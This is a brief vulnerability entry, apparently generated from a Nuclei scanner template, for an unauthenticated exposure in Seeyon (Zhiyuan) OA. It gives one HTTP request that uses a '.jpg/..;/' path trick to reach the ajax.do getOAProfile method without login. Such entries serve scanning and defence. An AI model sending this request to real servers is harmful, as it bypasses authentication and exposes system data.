# Vulnerability: Zhiyuan Oa Unauthorized
**Classification:** SEEYON
**Source:** Nuclei Template (`zhiyuan-oa-unauthorized.yaml`)

## Description
Zhiyuan Oa is exposed.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile
```

